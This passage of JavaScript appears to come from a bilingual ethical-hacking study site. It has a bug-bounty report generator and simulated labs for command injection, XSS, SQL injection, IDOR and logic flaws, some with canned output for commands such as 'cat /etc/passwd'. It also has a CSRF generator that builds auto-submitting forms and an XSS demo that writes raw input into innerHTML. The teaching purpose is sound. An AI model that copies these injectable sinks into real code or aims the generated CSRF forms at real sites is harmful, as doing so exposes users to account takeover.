  lfi: 'Validate file paths. Use allowlists for permitted files. Avoid user input in file paths.',
  auth: 'Implement multi-factor authentication. Use secure session management. Enforce strong password policies.',
  other: 'Follow OWASP guidelines. Implement defense in depth. Conduct regular security assessments.'
};

const vulnNames = {
  sqli: 'SQL Injection',
  xss: 'Cross-Site Scripting (XSS)',
  idor: 'Insecure Direct Object Reference (IDOR)',
  ssrf: 'Server-Side Request Forgery (SSRF)',
  csrf: 'Cross-Site Request Forgery (CSRF)',
  rce: 'Remote Code Execution (RCE)',
  lfi: 'Local File Inclusion (LFI)',
  auth: 'Authentication Bypass',
  other: 'Security Vulnerability'
};

function updateReportPreview() {
  const vulnType = document.getElementById('report-vuln-type')?.value || 'sqli';
  const severity = document.getElementById('report-severity')?.value || 'Critical';
  const url = document.getElementById('report-url')?.value || '[Not specified]';
  const param = document.getElementById('report-param')?.value || '[Not specified]';
  const payload = document.getElementById('report-payload')?.value || '[Not specified]';
  const steps = document.getElementById('report-steps')?.value || '[Not specified]';
  const impact = document.getElementById('report-impact')?.value || '[Not specified]';

  const report = `# Vulnerability Report: ${vulnNames[vulnType]}

## Summary
${vulnNames[vulnType]} vulnerability discovered in the target application that allows an attacker to potentially compromise the system.

**Severity:** ${severity}
**CVSS Score:** ${severity === 'Critical' ? '9.0-10.0' : severity === 'High' ? '7.0-8.9' : severity === 'Medium' ? '4.0-6.9' : '0.1-3.9'}

---

## Vulnerability Details
| Field | Value |
|-------|-------|
| **Type** | ${vulnNames[vulnType]} |
| **Affected URL** | ${url} |
| **Parameter** | ${param} |
| **Severity** | ${severity} |

---

## Steps to Reproduce
${steps.split('\\n').map((step, i) => step.trim() ? `${i + 1}. ${step.trim().replace(/^\d+\.\s*/, '')}` : '').filter(s => s).join('\n') || '1. [Fill in the steps to reproduce]'}

---

## Proof of Concept (Payload)
\`\`\`
${payload}
\`\`\`

---

## Impact
${impact}

---

## Remediation
${vulnRemediations[vulnType]}

---

## References
- OWASP: https://owasp.org/
- CWE Database: https://cwe.mitre.org/

---
*Report generated by Study Hub Bug Bounty Report Generator*`;

  const preview = document.getElementById('report-preview');
  if (preview) {
    preview.textContent = report;
  }
}

function getGeneratedReport() {
  const vulnType = document.getElementById('report-vuln-type')?.value || 'sqli';
  const severity = document.getElementById('report-severity')?.value || 'Critical';
  const url = document.getElementById('report-url')?.value || '[Not specified]';
  const param = document.getElementById('report-param')?.value || '[Not specified]';
  const payload = document.getElementById('report-payload')?.value || '[Not specified]';
  const steps = document.getElementById('report-steps')?.value || '[Not specified]';
  const impact = document.getElementById('report-impact')?.value || '[Not specified]';

  return `# Vulnerability Report: ${vulnNames[vulnType]}

## Summary
${vulnNames[vulnType]} vulnerability discovered in the target application.

**Severity:** ${severity}

## Vulnerability Details
- **Type:** ${vulnNames[vulnType]}
- **URL:** ${url}
- **Parameter:** ${param}

## Steps to Reproduce
${steps}

## Payload
\`\`\`
${payload}
\`\`\`

## Impact
${impact}

## Remediation
${vulnRemediations[vulnType]}

## References
- OWASP: https://owasp.org/
`;
}

function copyReport() {
  const report = document.getElementById('report-preview')?.textContent || getGeneratedReport();
  navigator.clipboard.writeText(report).then(() => {
    showNotification(txt('تم نسخ التقرير!', 'Report copied!'), 'success');
  });
}

function downloadReport() {
  const report = document.getElementById('report-preview')?.textContent || getGeneratedReport();
  const vulnType = document.getElementById('report-vuln-type')?.value || 'vulnerability';
  const blob = new Blob([report], { type: 'text/markdown' });
  const url = URL.createObjectURL(blob);
  const a = document.createElement('a');
  a.href = url;
  a.download = `${vulnType}-report-${Date.now()}.md`;
  document.body.appendChild(a);
  a.click();
  document.body.removeChild(a);
  URL.revokeObjectURL(url);
  showNotification(txt('تم تحميل التقرير!', 'Report downloaded!'), 'success');
}

function copyTemplate(templateId) {
  const template = bugBountyData.reportTemplates.find(t => t.id === templateId);
  if (template) {
    navigator.clipboard.writeText(template.template).then(() => {
      showNotification(txt('تم نسخ القالب!', 'Template copied!'), 'success');
    });
  }
}


/* ========== Bookmarks & Settings Fix ========== */

// pageBookmarks removed

// ==================== SETTINGS HELPERS ====================

window.saveProfileSettings = function () {
  const name = document.getElementById('setting-name').value;
  const title = document.getElementById('setting-title').value;

  if (name) localStorage.setItem('user_name', name);
  if (title) localStorage.setItem('user_title', title);

  alert(txt('تم حفظ الملف الشخصي بنجاح', 'Profile saved successfully'));

  // Update UI if needed (re-render nav?)
  if (window.renderNav) window.renderNav();
}

window.resetNotesOnly = function () {
  if (confirm(txt('هل أنت متأكد من حذف جميع الملاحظات؟', 'Are you sure you want to delete all notes?'))) {
    localStorage.removeItem('notes_data');
    alert(txt('تم حذف الملاحظات', 'Notes deleted'));
  }
}

window.resetProgressOnly = function () {
  if (confirm(txt('هل أنت متأكد من تصفير التقدم (XP والمستوى)؟', 'Are you sure you want to reset progress (XP & Level)?'))) {
    localStorage.removeItem('studyProgress');
    localStorage.removeItem('studyStats');
    localStorage.removeItem('xp');
    localStorage.removeItem('level');
    alert(txt('تم تصفير التقدم', 'Progress reset'));
    location.reload();
  }
}

window.resetAllData = function () {
  const code = prompt(txt('اكتب "DELETE" للتأكيد', 'Type "DELETE" to confirm'));
  if (code === 'DELETE') {
    localStorage.clear();
    alert(txt('تمت إعادة ضبط المصنع. سيتم إعادة تحميل الصفحة.', 'Factory reset complete. Reloading...'));
    location.reload();
  }
}

// ==================== SETTINGS PAGE ====================
function pageSettingsV2() {
  // Get current state
  const lang = localStorage.getItem('preferredLanguage') || 'ar';
  const theme = localStorage.getItem('theme') || 'light';

  // Profile Data
  const userName = localStorage.getItem('user_name') || '';
  const userTitle = localStorage.getItem('user_title') || '';

  return `
    <div class="container mt-4">
      <div class="d-flex justify-content-between align-items-center mb-4">
        <h2><i class="fa-solid fa-sliders text-primary"></i> ${txt('الإعدادات', 'Settings')}</h2>
        <span class="badge bg-secondary">v3.0.0</span>
      </div>
      
      <div class="row g-4">
        <!-- 1. Profile Settings -->
        <div class="col-lg-6">
          <div class="card h-100 shadow-sm border-primary">
            <div class="card-header bg-primary text-white">
              <h5 class="mb-0"><i class="fa-solid fa-user-gear"></i> ${txt('الملف الشخصي', 'Profile Settings')}</h5>
            </div>
            <div class="card-body">
              <div class="text-center mb-3">
                <div class="d-inline-block p-1 border rounded-circle">
                  <img src="https://via.placeholder.com/80" class="rounded-circle" alt="Avatar">
                </div>
              </div>
              <div class="mb-3">
                <label class="form-label">${txt('الاسم المستعار', 'Nickname')}</label>
                <input type="text" id="setting-name" class="form-control" value="${userName}" placeholder="Hacker01">
              </div>
              <div class="mb-3">
                <label class="form-label">${txt('المسمى الوظيفي / اللقب', 'Job Title / Badge')}</label>
                <input type="text" id="setting-title" class="form-control" value="${userTitle}" placeholder="Junior Pentester">
              </div>
              <button class="btn btn-primary w-100" onclick="saveProfileSettings()">
                <i class="fa-solid fa-save"></i> ${txt('حفظ التغييرات', 'Save Changes')}
              </button>
            </div>
          </div>
        </div>

        <!-- 2. Appearance & General -->
        <div class="col-lg-6">
          <div class="card h-100 shadow-sm">
            <div class="card-header bg-dark text-white">
              <h5 class="mb-0"><i class="fa-solid fa-palette"></i> ${txt('المظهر والعام', 'Appearance & General')}</h5>
            </div>
            <div class="card-body">
              <div class="mb-4">
                <label class="form-label fw-bold d-block"><i class="fa-solid fa-language me-2"></i>${txt('لغة الواجهة', 'Interface Language')}</label>
                <div class="btn-group w-100" role="group">
                  <button type="button" class="btn ${lang === 'ar' ? 'btn-primary' : 'btn-outline-primary'}" onclick="changeLanguageSetting('ar')">العربية</button>
                  <button type="button" class="btn ${lang === 'en' ? 'btn-primary' : 'btn-outline-primary'}" onclick="changeLanguageSetting('en')">English</button>
                </div>
              </div>
            </div>
          </div>
        </div>

        <!-- 3. Data Management -->
        <div class="col-lg-6">
          <div class="card h-100 shadow-sm">
            <div class="card-header bg-warning text-dark">
              <h5 class="mb-0"><i class="fa-solid fa-database"></i> ${txt('إدارة البيانات', 'Data Management')}</h5>
            </div>
            <div class="card-body">
              <ul class="list-group list-group-flush">
                <li class="list-group-item d-flex justify-content-between align-items-center">
                  <span><i class="fa-solid fa-note-sticky text-muted me-2"></i> ${txt('حذف الملاحظات فقط', 'Clear Notes Only')}</span>
                  <button class="btn btn-sm btn-outline-warning" onclick="resetNotesOnly()">${txt('حذف', 'Clear')}</button>
                </li>
                <li class="list-group-item d-flex justify-content-between align-items-center">
                  <span><i class="fa-solid fa-chart-line text-muted me-2"></i> ${txt('تصفير التقدم (XP)', 'Reset Progress (XP)')}</span>
                  <button class="btn btn-sm btn-outline-warning" onclick="resetProgressOnly()">${txt('تصفير', 'Reset')}</button>
                </li>
              </ul>
            </div>
          </div>
        </div>

        <!-- 4. Danger Zone -->
        <div class="col-lg-6">
          <div class="card h-100 shadow-sm border-danger">
            <div class="card-header bg-danger text-white">
              <h5 class="mb-0"><i class="fa-solid fa-radiation"></i> ${txt('منطقة الخطر', 'Danger Zone')}</h5>
            </div>
            <div class="card-body text-center">
              <i class="fa-solid fa-skull-crossbones fa-3x text-danger mb-3"></i>
              <p class="text-danger fw-bold">${txt('إجراءات لا رجعة فيها!', 'Irreversible Actions!')}</p>
              <button class="btn btn-danger w-100 py-2" onclick="resetAllData()">
                <i class="fa-solid fa-trash-can me-2"></i> ${txt('حذف جميع البيانات (Factory Reset)', 'Factory Reset (Delete All)')}
              </button>
              <small class="text-muted d-block mt-2">${txt('سيتم حذف كل شيء والعودة للبداية.', 'Everything will be deleted.')}</small>
            </div>
          </div>
        </div>

        <!-- 5. About -->
        <div class="col-12">
          <div class="card shadow-sm bg-light">
            <div class="card-body text-center">
              <h5 class="text-muted mb-3">BreachLabs <small>v3.0.0 (Beta)</small></h5>
              <div class="d-flex justify-content-center gap-3">
                <a href="#" class="btn btn-sm btn-outline-dark"><i class="fa-brands fa-github"></i> GitHub</a>
                <a href="#" class="btn btn-sm btn-outline-primary"><i class="fa-brands fa-discord"></i> Discord</a>
                <a href="#" class="btn btn-sm btn-outline-danger"><i class="fa-solid fa-bug"></i> Report Bug</a>
              </div>
              <p class="small text-muted mt-3 mb-0">&copy; 2025 BreachLabs Team. Built for ethical hacking education.</p>
            </div>
          </div>
        </div>

      </div>
    </div>
  `;
}

// ==================== PLAYGROUND HELPERS ====================

window.executeCommand = function () {
  const input = document.getElementById('cmd-input').value;
  const output = document.getElementById('cmd-output');
  if (!input) return;

  output.innerHTML += `<div><span class="text-warning">root@kali:~#</span> ${input}</div>`;

  // Simulator Logic
  const responses = {
    'ls': 'flag.txt\nusers.db\nconfig.php',
    'whoami': 'root',
    'cat flag.txt': 'CTF{C0mm4nd_1nj3ct10n_M4st3r}',
    'cat /etc/passwd': 'root:x:0:0:root:/root:/bin/bash\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin',
    'pwd': '/var/www/html'
  };

  let res = responses[input] || `bash: ${input}: command not found`;
  if (input.includes(';')) res = 'Suspicious character detection bypassed... Executing... \n' + (responses[input.split(';')[1].trim()] || 'Error');

  output.innerHTML += `<div class="text-white">${res.replace(/\n/g, '<br>')}</div>`;
  output.scrollTop = output.scrollHeight;
  document.getElementById('cmd-input').value = '';
}

window.testPayload = function () {
  const payload = document.getElementById('xss-input').value;
  const result = document.getElementById('xss-result');

  if (payload.includes('<script>') || payload.includes('alert') || payload.includes('onload')) {
    result.className = 'alert alert-danger mt-2';
    result.innerHTML = '<i class="fa-solid fa-bug"></i> ' + txt('تم تنفيذ الثغرة بنجاح! Payload Executed!', 'Vulnerability Exploited! Payload Executed!');
  } else {
    result.className = 'alert alert-secondary mt-2';
    result.innerHTML = txt('لم يتم التنفيذ. المحتوى آمن.', 'Not executed. Content safe.');
  }
}

window.simulateIDOR = function () {
  const id = document.getElementById('idor-id').value;
  const display = document.getElementById('idor-display');

  if (id == '123' || id == '100') {
    display.innerHTML = `
      <div class="card border-danger">
        <div class="card-body">
          <h5 class="text-danger">Admin Profile (ID: ${id})</h5>
          <p>Email: admin@company.com</p>
          <p>Role: Superuser</p>
          <p>Secret: <strong>SuperSecretKey123</strong></p>
        </div>
      </div>
    `;
  } else {
    display.innerHTML = `
      <div class="card">
        <div class="card-body">
          <h5>User Profile (ID: ${id})</h5>
          <p>Email: user${id}@company.com</p>
          <p>Role: Guest</p>
        </div>
      </div>
    `;
  }
}

window.buyItem = function (itemId) {
  const price = 1000; // Simulated price
  const wallet = document.getElementById('wallet-balance');
  const msg = document.getElementById('shop-msg');

  // Logic Flaw: Client-side manipulation simulation
  // In a real lab, you'd intercept request. Here we just show alert.
  msg.innerHTML = `<div class="alert alert-info">Intercept this request! Try changing price to 0.</div>`;
  alert('Simulating POST /buy {id: ' + itemId + ', price: 1000}. Try intercepting and changing price!');
}

window.httpRequest = function () {
  const url = document.getElementById('http-url').value;
  const method = document.getElementById('http-method').value;
  const output = document.getElementById('http-output');

  output.textContent = `${method} ${url} HTTP/1.1\nHost: target.com\nUser-Agent: StudyHub-Browser/1.0\nAccept: */*\n\n[Waiting for response...]`;

  setTimeout(() => {
    output.textContent += `\n\nHTTP/1.1 200 OK\nServer: nginx\nContent-Type: application/json\n\n{"status": "success", "data": "Sample response from ${url}"}`;
  }, 1000);
}

// WebSocket Helper
let wsSocketMock = false;
window.wsConnect = function () {
  const status = document.getElementById('ws-status');
  status.className = 'badge bg-warning';
  status.innerText = 'Connecting...';

  setTimeout(() => {
    wsSocketMock = true;
    status.className = 'badge bg-success';
    status.innerText = 'Connected';
    document.getElementById('ws-output').innerHTML += '<div class="text-success system-msg">> Connection established</div>';
  }, 1500);
}

window.wsSend = function () {
  if (!wsSocketMock) { alert('Connect first!'); return; }
  const msg = document.getElementById('ws-input').value;
  const output = document.getElementById('ws-output');

  output.innerHTML += `<div class="text-white user-msg">> ${msg}</div>`;
  document.getElementById('ws-input').value = '';

  setTimeout(() => {
    output.innerHTML += `<div class="text-info server-msg">< Server echo: ${msg}</div>`;
    output.scrollTop = output.scrollHeight;
  }, 500);
}

window.inspectStorage = function () {
  const output = document.getElementById('storage-output');
  output.innerHTML = '';

  // LocalStorage
  for (let i = 0; i < localStorage.length; i++) {
    const k = localStorage.key(i);
    const v = localStorage.getItem(k);
    // Mask long values
    const vDisplay = v.length > 50 ? v.substring(0, 50) + '...' : v;
    output.innerHTML += `<tr><td>LocalStorage</td><td>${k}</td><td><code>${vDisplay}</code></td></tr>`;
  }

  // Cookie Sim
  output.innerHTML += `<tr><td>Cookie</td><td>session_id</td><td><code>h4ck3d_s3ss10n_id_9921</code></td></tr>`;
}

window.analyzeHeaders = function () {
  const headers = document.getElementById('header-input').value;
  const results = document.getElementById('header-results');
  results.innerHTML = '';

  const missing = [];
  if (!headers.toLowerCase().includes('x-frame-options')) missing.push('X-Frame-Options (Clickjacking risk)');
  if (!headers.toLowerCase().includes('content-security-policy')) missing.push('CSP (XSS risk)');
  if (!headers.toLowerCase().includes('strict-transport-security')) missing.push('HSTS (MITM risk)');

  if (missing.length === 0) {
    results.innerHTML = '<div class="alert alert-success">Great! All basic security headers detected.</div>';
  } else {
    results.innerHTML = '<div class="alert alert-warning"><strong>Missing Headers:</strong><ul>' + missing.map(m => `<li>${m}</li>`).join('') + '</ul></div>';
  }
}

window.generateCSRF = function () {
  const url = document.getElementById('csrf-url').value;
  const method = document.getElementById('csrf-method').value;
  const params = document.getElementById('csrf-params').value; // key=value
  const output = document.getElementById('csrf-output');

  const formHtml = `
<html>
  <body>
    <form action="${url}" method="${method}">
      ${params.split('&').map(p => {
    const [k, v] = p.split('=');
    return `<input type="hidden" name="${k}" value="${v}" />`;
  }).join('\n      ')}
      <input type="submit" value="Click Me">
    </form>
    <script>document.forms[0].submit();<\/script>
  </body>
</html>`;

  output.textContent = formHtml;
}

window.jwtVerifyHS = function () {
  const jwt = document.getElementById('jwt-input').value;
  const secret = document.getElementById('jwt-secret').value;
  // Mock simulation
  if (secret === 'secret123') {
    alert('Signature Verified! (Simulated)');
  } else {
    alert('Invalid Signature! (Simulated)');
  }
}

window.jwtVerifyRS = function () {
  alert('RS256 Verification requires public key (Simulated Only)');
}


// ==================== eJPT HELPERS ====================

window.updateEjptProgress = function (topicId, isChecked) {
  // Get existing
  const ejptProgress = JSON.parse(localStorage.getItem('ejpt_progress') || '{}');

  if (isChecked) {
    ejptProgress[topicId] = true;
  } else {
    delete ejptProgress[topicId];
  }

  localStorage.setItem('ejpt_progress', JSON.stringify(ejptProgress));

  // Update UI (Progress Bar)
  // Re-calculate
  const domains = [
    { topics: ['d1-t1', 'd1-t2', 'd1-t3', 'd1-t4'] },
    { topics: ['d2-t1', 'd2-t2', 'd2-t3'] },
    { topics: ['d3-t1', 'd3-t2', 'd3-t3', 'd3-t4'] },
    { topics: ['d4-t1', 'd4-t2', 'd4-t3', 'd4-t4'] }
  ];

  let total = 0;
  let completed = 0;

  // Re-count all
  domains.forEach(d => {
    d.topics.forEach(t => {
      total++;
      if (ejptProgress[t]) completed++;
    });
  });

  const percent = Math.round((completed / total) * 100);

  // Locate progress bar if exists in DOM
  const bar = document.querySelector('.ejpt-hero .progress-bar');
  if (bar) {
    bar.style.width = percent + '%';
    bar.innerText = percent + '% ' + (currentLang === 'ar' ? 'مكتمل' : 'Completed');
  }
}

// ==================== MISSING PLAYGROUND FUNCTIONS ====================

// XSS Simulator
window.testXSS = function () {
  const payload = document.getElementById('xss-input').value;
  const output = document.getElementById('xss-output');

  // Render it (for demo purposes - in reality this is dangerous!)
  output.innerHTML = payload;
}

// SQL Injection Simulator
window.simulateSQL = function () {
  const username = document.getElementById('sql-username').value;
  const password = document.getElementById('sql-password').value;
  const query = document.getElementById('sql-query');
  const result = document.getElementById('sql-result');

  // Build the query
  const queryStr = `SELECT * FROM users WHERE username='${username}' AND password='${password}'`;
  query.textContent = queryStr;

  // Check for injection
  if (username.includes("'") || password.includes("'")) {
    result.className = 'alert alert-danger';
    result.innerHTML = '<i class="fa-solid fa-check-circle"></i> SQL Injection detected! Access Granted as Admin.';
  } else {
    result.className = 'alert alert-secondary';
    result.innerHTML = '<i class="fa-solid fa-times-circle"></i> Login failed. Invalid credentials.';
  }
}

// JWT Decoder
window.decodeJWT = function () {
  const jwt = document.getElementById('jwt-input').value;
  const headerEl = document.getElementById('jwt-header');
  const payloadEl = document.getElementById('jwt-payload');
  const signatureEl = document.getElementById('jwt-signature');

  try {
    const parts = jwt.split('.');
    if (parts.length !== 3) throw new Error('Invalid JWT format');

    headerEl.textContent = JSON.stringify(JSON.parse(atob(parts[0])), null, 2);
    payloadEl.textContent = JSON.stringify(JSON.parse(atob(parts[1])), null, 2);
    signatureEl.textContent = parts[2];
  } catch (e) {
    headerEl.textContent = 'Error: ' + e.message;
    payloadEl.textContent = '';
    signatureEl.textContent = '';
  }
}

// Command Injection Simulator
window.simulateCmdInjection = function () {
  const input = document.getElementById('cmd-input').value;
  const output = document.getElementById('cmd-output');

  // Base ping output
  let response = `PING ${input} (${input}): 56 data bytes\n64 bytes from ${input}: icmp_seq=0 ttl=64 time=0.045 ms\n64 bytes from ${input}: icmp_seq=1 ttl=64 time=0.042 ms\n--- ${input} ping statistics ---\n2 packets transmitted, 2 packets received, 0.0% packet loss`;

  // Check for injection
  if (input.includes(';') || input.includes('|') || input.includes('&&')) {
    // Simulate command injection success
    const injectedCmd = input.split(/[;|&]+/)[1]?.trim() || '';
    const cmdResponses = {
      'whoami': 'root',
      'id': 'uid=0(root) gid=0(root) groups=0(root)',
      'cat /etc/passwd': 'root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin',
      'ls': 'app.js\nconfig.php\nflag.txt\nindex.html',
      'cat flag.txt': 'CTF{C0mm4nd_1nj3ct10n_W1n}'
    };

    response += `\n\n[Injection Detected!]\n$ ${injectedCmd}\n${cmdResponses[injectedCmd] || `bash: ${injectedCmd}: command not found`}`;
  }

  output.textContent = response;
}

// IDOR Simulator (update to use correct element ID)
window.simulateIDOR = function () {
  const id = document.getElementById('idor-input').value;
  const result = document.getElementById('idor-result');

  const users = {
    '100': { name: 'Admin', email: 'admin@company.com', role: 'Administrator', secret: 'SuperSecretAdminKey!' },
    '101': { name: 'You', email: 'user@company.com', role: 'User', secret: null },
    '102': { name: 'John', email: 'john@company.com', role: 'Moderator', secret: 'ModeratorKey123' }
  };

  const user = users[id];

  if (user) {
    const secretHtml = user.secret ? `<p class="text-danger"><strong>Secret:</strong> ${user.secret}</p>` : '';
    result.innerHTML = `
      <div class="card ${id !== '101' ? 'border-danger' : ''}">
        <div class="card-header ${id !== '101' ? 'bg-danger text-white' : ''}">
          ${id !== '101' ? '<i class="fa-solid fa-triangle-exclamation me-2"></i>IDOR Vulnerability Exploited!' : ''}
          User Profile #${id}
        </div>
        <div class="card-body">
          <p><strong>Name:</strong> ${user.name}</p>
          <p><strong>Email:</strong> ${user.email}</p>
          <p><strong>Role:</strong> ${user.role}</p>
          ${secretHtml}
        </div>
      </div>
    `;
  } else {
    result.innerHTML = `<div class="alert alert-warning">User not found (ID: ${id})</div>`;
  }
}

// Logic Flaw Shop
window.buyItem = function (item) {
  const log = document.getElementById('shop-log');
  const timestamp = new Date().toLocaleTimeString();

  if (item === 'flag') {
    // Check for negative quantity exploit
    const qty = parseInt(document.getElementById('qty-flag').value);
    const price = 1000 * qty;

    if (qty < 0) {
      log.innerHTML += `[${timestamp}] <span class="text-success">EXPLOIT! Negative quantity accepted. Balance increased by $${Math.abs(price)}!</span>\n`;
      log.innerHTML += `[${timestamp}] <span class="text-warning">FLAG: CTF{N3g4t1v3_Qu4nt1ty_H4ck}</span>\n`;
    } else if (price > 100) {
      log.innerHTML += `[${timestamp}] <span class="text-danger">Failed: Insufficient balance ($100 < $${price})</span>\n`;
    } else {
      log.innerHTML += `[${timestamp}] <span class="text-success">Purchased ${qty} Flag(s) for $${price}</span>\n`;
    }
  } else {
    log.innerHTML += `[${timestamp}] Purchased T-Shirt for $20\n`;
  }

  log.scrollTop = log.scrollHeight;
}

// Base64 Encoder/Decoder
window.base64Encode = function () {
  const input = document.getElementById('b64-input').value;
  document.getElementById('b64-output').value = btoa(input);
}

window.base64Decode = function () {
  const input = document.getElementById('b64-input').value;
  try {
    document.getElementById('b64-output').value = atob(input);
  } catch (e) {
    document.getElementById('b64-output').value = 'Error: Invalid Base64';
  }
}

// Hash Generator
window.generateHash = function () {
  alert('Hash generation requires a crypto library. This is a demo placeholder.');
}

// URL Encoder/Decoder
window.urlEncode = function () {
  const input = document.getElementById('url-input').value;
  document.getElementById('url-output').value = encodeURIComponent(input);
}

window.urlDecode = function () {
  const input = document.getElementById('url-input').value;
  try {
    document.getElementById('url-output').value = decodeURIComponent(input);
  } catch (e) {
    document.getElementById('url-output').value = 'Error: Invalid URL encoding';
  }
}

// WebSocket Close
window.wsClose = function () {
  const log = document.getElementById('ws-log');
  log.textContent += '[System] Connection closed\n';
}

// Load User Profile (for IDOR demo)
window.loadUserProfile = function (id) {
  document.getElementById('idor-input').value = id;
  simulateIDOR();
}

// ========== YouTube Video Viewer ==========
function pageYouTubeViewer(playlistId) {
  var ytData = typeof youtubeCoursesData !== 'undefined' ? youtubeCoursesData : { categories: [], playlists: [] };
  var playlist = ytData.playlists.find(function (p) { return p.id === playlistId; });

  if (!playlist) {
    return '<div class="container mt-5"><div class="alert alert-danger"><i class="fa-solid fa-exclamation-triangle me-2"></i>' +
      txt('لم يتم العثور على قائمة التشغيل', 'Playlist not found') + '</div></div>';
  }

  // Get saved progress
  var ytProgress = JSON.parse(localStorage.getItem('youtube_progress') || '{}');
  var playlistProgress = ytProgress[playlistId] || { currentVideo: 0, watchedVideos: [], rating: 0, isFavorite: false, notes: '', watchTime: 0 };
  var currentVideoIndex = playlistProgress.currentVideo || 0;
  var currentVideo = playlist.videos[currentVideoIndex];

  // Calculate stats
  var watchedCount = (playlistProgress.watchedVideos || []).length;
  var progressPercent = Math.round((watchedCount / playlist.totalVideos) * 100);
  var estimatedDuration = playlist.totalVideos * 10; // ~10 min per video
  var watchTimeMinutes = Math.round((playlistProgress.watchTime || 0) / 60);
  var currentRating = playlistProgress.rating || 0;
  var isFavorite = playlistProgress.isFavorite || false;
  var userNotes = playlistProgress.notes || '';
  var hasCertificate = progressPercent === 100;

  // Category info
  var category = ytData.categories.find(function (c) { return c.id === playlist.category; });
  var catColor = category ? category.color : '#667eea';
  var catName = category ? (currentLang === 'ar' ? category.nameAr : category.name) : '';

  // Level info
  var levelText = playlist.level === 'beginner' ? txt('مبتدئ', 'Beginner') :
    playlist.level === 'intermediate' ? txt('متوسط', 'Intermediate') : txt('متقدم', 'Advanced');
  var levelColor = playlist.level === 'beginner' ? '#28a745' : playlist.level === 'intermediate' ? '#ffc107' : '#dc3545';

  // Build videos list HTML
  var videosListHtml = '';
  playlist.videos.forEach(function (video, index) {
    var isWatched = (playlistProgress.watchedVideos || []).indexOf(video.videoId) !== -1;
    var isActive = index === currentVideoIndex;
    videosListHtml += '<div class="video-item ' + (isActive ? 'active' : '') + ' ' + (isWatched ? 'watched' : '') + '" onclick="playYouTubeVideo(\'' + playlistId + '\', ' + index + ')" data-index="' + index + '">' +
      '<div class="video-num">' + (isWatched ? '<i class="fa-solid fa-check"></i>' : (index + 1)) + '</div>' +
      '<div class="video-info"><div class="video-title">' + video.title + '</div><div class="video-duration"><i class="fa-solid fa-clock"></i> ~10 ' + txt('دقائق', 'min') + '</div></div>' +
      (isActive ? '<i class="fa-solid fa-play-circle playing-icon"></i>' : '') +
      '</div>';
  });

  // Build rating stars HTML
  var starsHtml = '';
  for (var i = 1; i <= 5; i++) {
    var starClass = i <= currentRating ? 'active' : '';
    starsHtml += '<i class="fa-solid fa-star rating-star ' + starClass + '" data-rating="' + i + '" onclick="rateYouTubeCourse(\'' + playlistId + '\', ' + i + ')"></i>';
  }

  return '<div class="yt-viewer-container" id="yt-viewer" data-playlist="' + playlistId + '">' +
    '<style>' +
    // Base styles with animated gradient background
    '.yt-viewer-container { min-height: 100vh; background: linear-gradient(135deg, #0a0a1a 0%, #1a1a3e 50%, #0f2027 100%); color: #fff; transition: all 0.4s ease; position: relative; overflow-x: hidden; }' +
    '.yt-viewer-container::before { content: ""; position: absolute; top: 0; left: 0; right: 0; height: 400px; background: radial-gradient(ellipse at top, rgba(102,126,234,0.15) 0%, transparent 70%); pointer-events: none; }' +
    '.yt-viewer-container.theater-mode .yt-playlist-sidebar { display: none; }' +
    '.yt-viewer-container.theater-mode .yt-viewer-main { grid-template-columns: 1fr; }' +
    '.yt-viewer-container.theater-mode .yt-player-wrapper { padding-bottom: 70%; }' +

    // Glassmorphism Header
    '.yt-header { background: rgba(15,15,35,0.8); backdrop-filter: blur(20px); -webkit-backdrop-filter: blur(20px); padding: 25px 30px; border-bottom: 1px solid rgba(255,255,255,0.08); position: relative; z-index: 10; }' +
    '.yt-header-top { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; }' +
    '.yt-back-btn { background: linear-gradient(135deg, rgba(102,126,234,0.2), rgba(118,75,162,0.2)); border: 1px solid rgba(102,126,234,0.3); color: white; padding: 12px 24px; border-radius: 12px; cursor: pointer; transition: all 0.3s ease; font-weight: 500; display: flex; align-items: center; gap: 8px; }' +
    '.yt-back-btn:hover { background: linear-gradient(135deg, rgba(102,126,234,0.4), rgba(118,75,162,0.4)); transform: translateX(-3px); box-shadow: 0 5px 20px rgba(102,126,234,0.3); }' +
    '.yt-header-actions { display: flex; gap: 12px; }' +
    '.yt-action-btn { background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.1); color: white; padding: 12px 16px; border-radius: 12px; cursor: pointer; transition: all 0.3s ease; font-size: 1.1rem; }' +
    '.yt-action-btn:hover { background: rgba(255,255,255,0.15); transform: scale(1.05); }' +
    '.yt-action-btn.active { background: linear-gradient(135deg, #667eea, #764ba2); border-color: transparent; box-shadow: 0 4px 15px rgba(102,126,234,0.4); }' +
    '.yt-action-btn.favorite.active { background: linear-gradient(135deg, #e74c3c, #c0392b); box-shadow: 0 4px 15px rgba(231,76,60,0.4); }' +

    // Course info with glassmorphism cards
    '.yt-course-info { display: grid; grid-template-columns: auto 1fr auto; gap: 25px; align-items: start; padding: 5px; }' +
    '.yt-thumbnail { width: 220px; height: 124px; background-size: cover; background-position: center; border-radius: 16px; box-shadow: 0 10px 30px rgba(0,0,0,0.4); position: relative; overflow: hidden; }' +
    '.yt-thumbnail::after { content: ""; position: absolute; inset: 0; background: linear-gradient(to bottom, transparent 50%, rgba(0,0,0,0.7) 100%); }' +
    '.yt-course-details { position: relative; }' +
    '.yt-course-details h1 { font-size: 1.6rem; margin-bottom: 12px; font-weight: 700; background: linear-gradient(90deg, #fff, #e0e0e0); -webkit-background-clip: text; -webkit-text-fill-color: transparent; line-height: 1.4; }' +
    '.yt-course-details p { opacity: 0.75; font-size: 0.95rem; margin-bottom: 15px; line-height: 1.6; max-width: 600px; }' +
    '.yt-meta-badges { display: flex; gap: 10px; flex-wrap: wrap; }' +
    '.yt-badge { padding: 6px 14px; border-radius: 25px; font-size: 0.8rem; font-weight: 600; display: flex; align-items: center; gap: 6px; backdrop-filter: blur(10px); border: 1px solid rgba(255,255,255,0.1); }' +
    '.yt-stats-box { background: rgba(255,255,255,0.03); backdrop-filter: blur(10px); padding: 20px 25px; border-radius: 16px; text-align: center; min-width: 160px; border: 1px solid rgba(255,255,255,0.08); transition: all 0.3s ease; }' +
    '.yt-stats-box:hover { transform: translateY(-3px); border-color: rgba(102,126,234,0.3); box-shadow: 0 10px 30px rgba(102,126,234,0.15); }' +
    '.yt-stats-box h3 { font-size: 2.2rem; margin-bottom: 5px; background: linear-gradient(135deg, #667eea, #764ba2); -webkit-background-clip: text; -webkit-text-fill-color: transparent; font-weight: 800; transition: transform 0.3s; }' +
